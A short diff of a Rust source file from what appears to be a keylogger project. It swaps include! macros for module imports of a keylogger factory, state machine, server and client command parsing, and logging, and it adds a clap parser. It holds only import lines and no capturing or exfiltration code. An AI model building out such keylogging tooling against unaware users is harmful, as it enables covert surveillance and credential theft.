@@ -1,11 +1,14 @@
 use std::io::prelude::*;
 use std::os::unix::net::UnixListener;
 use std::os::unix::net::UnixStream;
+use clap::Parser;
 
-include!("../client_input.rs");
-include!("../server_input.rs");
-include!("../logger.rs");
-include!("../keylogger_fsm.rs");
+use keylogger::keylog::keylog_factory::{KeyloggerFactory, KeyloggerTypes, KeyloggerFact};
+use keylogger::keylogger_fsm::{State, IdleState};
+use keylogger::server_input::ServerCli;
+use keylogger::client_input::Commands;
+use keylogger::logger::init_logger;
+
 //include!("../keylog/keylog_factory.rs");
 
 struct KeyLoggerFSM {
